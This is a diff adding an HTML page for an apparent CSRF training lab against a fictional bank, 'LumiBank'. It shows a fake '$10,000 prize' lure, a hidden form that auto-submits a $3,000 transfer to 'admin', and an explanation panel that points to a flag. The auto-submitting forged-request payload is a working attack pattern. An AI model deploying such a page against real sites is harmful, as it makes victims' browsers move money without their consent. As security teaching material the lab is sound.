@@ -1,0 +1,407 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🎉 Congratulations! You Won!</title>
+    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;700;800&display=swap"
+        rel="stylesheet">
+    <style>
+        :root {
+            --bg: #fefce8;
+            --gold: #f59e0b;
+            --gold-dark: #d97706;
+            --text: #1c1917;
+            --text-dim: #78716c;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Plus Jakarta Sans', sans-serif;
+            background: var(--bg);
+            color: var(--text);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            background-image:
+                radial-gradient(circle at 30% 20%, rgba(245, 158, 11, 0.15) 0%, transparent 40%),
+                radial-gradient(circle at 70% 80%, rgba(245, 158, 11, 0.1) 0%, transparent 40%);
+        }
+
+        /* --- EDUCATIONAL ALERT BANNER --- */
+        .edu-banner {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            background: linear-gradient(135deg, #dc2626, #991b1b);
+            color: white;
+            padding: 1rem 2rem;
+            display: flex;
+            align-items: center;
+            gap: 1rem;
+            z-index: 1000;
+            box-shadow: 0 4px 20px rgba(220, 38, 38, 0.3);
+            animation: slideDown 0.6s ease-out;
+        }
+
+        @keyframes slideDown {
+            from {
+                transform: translateY(-100%);
+            }
+
+            to {
+                transform: translateY(0);
+            }
+        }
+
+        .edu-banner .alert-icon {
+            width: 40px;
+            height: 40px;
+            background: rgba(255, 255, 255, 0.15);
+            border-radius: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+        }
+
+        .edu-banner .alert-content {
+            flex: 1;
+        }
+
+        .edu-banner .alert-title {
+            font-weight: 800;
+            font-size: 0.9rem;
+            margin-bottom: 0.2rem;
+        }
+
+        .edu-banner .alert-text {
+            font-size: 0.8rem;
+            opacity: 0.9;
+            line-height: 1.4;
+        }
+
+        /* --- Fake Prize Page --- */
+        .prize-card {
+            max-width: 520px;
+            width: 90%;
+            background: white;
+            border-radius: 2rem;
+            padding: 3rem;
+            text-align: center;
+            box-shadow: 0 25px 60px rgba(0, 0, 0, 0.08);
+            border: 2px solid rgba(245, 158, 11, 0.2);
+            position: relative;
+            overflow: hidden;
+            animation: fadeIn 0.8s ease-out 0.3s both;
+            margin-top: 3rem;
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: translateY(20px);
+            }
+
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .prize-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 4px;
+            background: linear-gradient(to right, var(--gold), #ef4444, var(--gold));
+        }
+
+        /* Confetti burst */
+        .confetti-wrapper {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: 5;
+            overflow: hidden;
+        }
+
+        .confetti {
+            position: absolute;
+            width: 10px;
+            height: 10px;
+            border-radius: 2px;
+            animation: confettiFall linear infinite;
+        }
+
+        @keyframes confettiFall {
+            0% {
+                transform: translateY(-10vh) rotate(0deg);
+                opacity: 1;
+            }
+
+            100% {
+                transform: translateY(110vh) rotate(720deg);
+                opacity: 0;
+            }
+        }
+
+        .trophy {
+            font-size: 4rem;
+            margin-bottom: 1rem;
+            animation: bounce 2s ease-in-out infinite;
+        }
+
+        @keyframes bounce {
+
+            0%,
+            100% {
+                transform: translateY(0);
+            }
+
+            50% {
+                transform: translateY(-10px);
+            }
+        }
+
+        h1 {
+            font-size: 2rem;
+            font-weight: 800;
+            margin-bottom: 0.5rem;
+            color: var(--gold-dark);
+        }
+
+        .subtitle {
+            color: var(--text-dim);
+            font-size: 0.95rem;
+            margin-bottom: 2rem;
+            line-height: 1.5;
+        }
+
+        .prize-amount {
+            font-size: 3rem;
+            font-weight: 800;
+            color: var(--gold-dark);
+            margin-bottom: 1.5rem;
+            text-shadow: 0 2px 10px rgba(245, 158, 11, 0.3);
+        }
+
+        .claim-btn {
+            display: inline-block;
+            padding: 1rem 3rem;
+            background: linear-gradient(135deg, var(--gold), var(--gold-dark));
+            color: white;
+            border: none;
+            border-radius: 99px;
+            font-weight: 800;
+            font-size: 1.1rem;
+            cursor: pointer;
+            box-shadow: 0 8px 25px rgba(245, 158, 11, 0.35);
+            transition: all 0.3s;
+            text-transform: uppercase;
+            letter-spacing: 0.05em;
+            margin-bottom: 1.5rem;
+        }
+
+        .claim-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 12px 30px rgba(245, 158, 11, 0.45);
+        }
+
+        .fine-print {
+            font-size: 0.7rem;
+            color: #a8a29e;
+            line-height: 1.5;
+        }
+
+        /* --- Educational Details (appears after auto-submit) --- */
+        .edu-detail {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            background: rgba(15, 23, 42, 0.97);
+            backdrop-filter: blur(20px);
+            color: white;
+            padding: 1.75rem 2rem;
+            transform: translateY(100%);
+            transition: transform 0.6s cubic-bezier(0.4, 0, 0.2, 1);
+            z-index: 100;
+            box-shadow: 0 -10px 40px rgba(0, 0, 0, 0.4);
+        }
+
+        .edu-detail.show {
+            transform: translateY(0);
+        }
+
+        .edu-detail h3 {
+            font-size: 1rem;
+            font-weight: 800;
+            color: #fca5a5;
+            margin-bottom: 0.5rem;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+
+        .edu-detail p {
+            font-size: 0.85rem;
+            color: #94a3b8;
+            line-height: 1.6;
+            margin-bottom: 0.75rem;
+        }
+
+        .edu-detail code {
+            background: rgba(99, 102, 241, 0.15);
+            color: #818cf8;
+            padding: 0.15rem 0.4rem;
+            border-radius: 4px;
+            font-size: 0.85em;
+        }
+
+        .edu-detail a {
+            color: #818cf8;
+            font-weight: 700;
+            text-decoration: none;
+        }
+
+        .edu-detail a:hover {
+            text-decoration: underline;
+        }
+
+        .status-indicator {
+            display: inline-flex;
+            align-items: center;
+            gap: 0.4rem;
+            background: rgba(239, 68, 68, 0.1);
+            border: 1px solid rgba(239, 68, 68, 0.2);
+            padding: 0.3rem 0.8rem;
+            border-radius: 99px;
+            font-size: 0.7rem;
+            font-weight: 700;
+            color: #fca5a5;
+            margin-bottom: 0.75rem;
+        }
+
+        .status-dot {
+            width: 6px;
+            height: 6px;
+            border-radius: 50%;
+            background: #ef4444;
+            animation: blink 1s infinite;
+        }
+
+        @keyframes blink {
+
+            0%,
+            100% {
+                opacity: 1;
+            }
+
+            50% {
+                opacity: 0.3;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <!-- Educational Alert Banner -->
+    <div class="edu-banner">
+        <div class="alert-icon">
+            <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2.5">
+                <path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z">
+                </path>
+                <line x1="12" y1="9" x2="12" y2="13"></line>
+                <line x1="12" y1="17" x2="12.01" y2="17"></line>
+            </svg>
+        </div>
+        <div class="alert-content">
+            <div class="alert-title">⚠ CSRF Attack Simulation Active</div>
+            <div class="alert-text">This page simulates a malicious website. A hidden form is auto-submitting a bank
+                transfer using your session. This is for educational purposes only.</div>
+        </div>
+    </div>
+
+    <!-- Confetti -->
+    <div class="confetti-wrapper" id="confettiWrap"></div>
+
+    <!-- Fake Prize Card -->
+    <div class="prize-card">
+        <div class="trophy">🏆</div>
+        <h1>You're Our Lucky Winner!</h1>
+        <p class="subtitle">Congratulations! You've been selected as today's grand prize winner in our seasonal
+            sweepstakes.</p>
+
+        <div class="prize-amount">$10,000.00</div>
+
+        <button class="claim-btn" onclick="alert('This is a simulated phishing page for CSRF education!')">CLAIM YOUR
+            PRIZE</button>
+
+        <p class="fine-print">*Subject to eligibility. By clicking above you agree to our terms. Processing time 3-5
+            business days. Offer valid while supplies last. Not affiliated with any real organization.</p>
+    </div>
+
+    <!-- Hidden CSRF Form (auto-submits) -->
+    <form id="csrfForm" method="POST" action="/transfer" style="display: none;">
+        <input type="hidden" name="to" value="admin">
+        <input type="hidden" name="amount" value="3000">
+    </form>
+
+    <!-- Educational Bottom Panel -->
+    <div class="edu-detail" id="eduPanel">
+        <div class="status-indicator">
+            <div class="status-dot"></div> CSRF ATTACK EXECUTED
+        </div>
+        <h3>🔍 What just happened?</h3>
+        <p>This page contained a <code>&lt;form&gt;</code> with hidden fields that auto-submitted a <strong>$3,000
+                transfer</strong> to <code>admin</code>.
+            Because LumiBank has <strong>no CSRF token protection</strong>, your browser automatically attached your
+            session cookie to the forged request.</p>
+        <p>→ <a href="/">Return to LumiBank Dashboard</a> to see the damage, then visit <a href="/flag">/flag</a> to
+            claim your flag!</p>
+    </div>
+
+    <script>
+        // Generate confetti
+        const wrapper = document.getElementById('confettiWrap');
+        const colors = ['#f59e0b', '#ef4444', '#6366f1', '#10b981', '#ec4899', '#8b5cf6'];
+        for (let i = 0; i < 60; i++) {
+            const conf = document.createElement('div');
+            conf.className = 'confetti';
+            conf.style.left = Math.random() * 100 + '%';
+            conf.style.background = colors[Math.floor(Math.random() * colors.length)];
+            conf.style.animationDuration = (Math.random() * 3 + 2) + 's';
+            conf.style.animationDelay = (Math.random() * 3) + 's';
+            conf.style.width = (Math.random() * 8 + 5) + 'px';
+            conf.style.height = (Math.random() * 8 + 5) + 'px';
+            wrapper.appendChild(conf);
+        }
+
+        // Auto-submit the CSRF form after a short delay (simulating the attack)
+        setTimeout(function () {
+            document.getElementById('csrfForm').submit();
+        }, 4000);
+
+        // Show educational panel after 1.5s
+        setTimeout(function () {
+            document.getElementById('eduPanel').classList.add('show');
+        }, 1500);
+    </script>
+</body>
+
+</html>
